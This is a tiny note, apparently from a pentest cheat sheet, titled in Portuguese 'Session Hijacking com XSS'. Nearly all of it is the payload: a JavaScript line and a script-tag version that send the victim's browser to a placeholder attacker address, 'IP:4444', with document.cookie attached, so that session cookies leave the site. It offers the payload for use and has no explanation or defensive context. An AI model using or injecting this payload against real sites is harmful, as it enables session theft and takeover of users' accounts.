# Session Hijacking com XSS

document.location = "http://IP:4444/?cookie="+document.cookie





\<script>document.location = "http://IP:4444/?cookie="+document.cookie\</script>
